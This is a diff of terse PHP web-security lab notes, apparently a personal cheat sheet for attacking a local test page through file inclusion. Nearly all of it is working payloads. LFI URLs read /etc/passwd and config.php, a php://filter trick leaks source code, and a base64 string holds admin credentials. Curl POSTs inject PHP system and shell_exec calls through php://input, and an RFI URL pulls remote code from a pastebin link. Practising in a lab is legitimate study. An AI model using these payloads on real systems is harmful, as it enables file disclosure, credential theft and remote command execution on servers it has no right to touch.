@@ -1,3 +1,35 @@
+- VUL : LFI (Local File Inclusion) :
+http://localhost/web_security/RFI/index.php?page=/etc/passwd
+http://localhost/web_security/RFI/index.php?page=config.php
+
+- Attact php://filter :
+http://localhost/web_security/RFI/index.php?page=php://filter/convert.base64-encode/resource=config.php
+
+- base64 decode :
+https://www.base64decode.org/
+or 
+echo "PD9waHANCg0KZGVmaW5lKCJBRE1JTl9VU0VSIiwgIkloc2FuIik7DQpkZWZpbmUoIkFETUlOX1BBU1MiLCAiYWRtaW4xMjMiKTsNCg==" | base64 -d
+
+- Attack php://input :
+php.ini :
+allow_url_include = Off (default)
+allow_url_include = On
+
+======Windows=======
+curl -X "POST" -d "<?php echo system('dir c:\*.*'); ?>" "http://localhost/web_security/RFI/index.php?page=php://input"
+
+curl -X POST -d "<?php echo system('dir'); ?>" http://localhost/web_security/rfi/index.php?page=php://input
+
+curl -X POST -d "<?php echo system('cat config.php'); ?>" http://localhost/web_security/rfi/index.php?page=php://input
+
+======Linux=======
+curl -X POST -d "<?php echo shell_exec('uname -a'); ?>" http://localhost/web_security/lfi/index.php?page=php://input
+
+curl -X POST -d "<?php echo shell_exec('uname -a'); ?>" http://localhost/web_security/rfi/index.php?page=php://input
+
+curl -X "POST" -d "<?php echo shell_exec('ls -la'); ?>" "http://localhost/web_security/RFI/index.php?page=php://input"
+
+
 - VULN : RFI (Remote File Inclusion) :
 php.ini :
 allow_url_include = Off (default)
@@ -13,9 +45,6 @@ https://pastebin.com/
 https://pastebin.com/raw/GLDUFzev
 
 http://localhost/RFI/index.php?page=https://pastebin.com/raw/GLDUFzev
-
-https://www.base64decode.org/
-http://localhost/web_security/lfi/index.php?page=php://filter/convert.base64-encode/resource=config.php
 
 - simple backdoor :
 <pre>
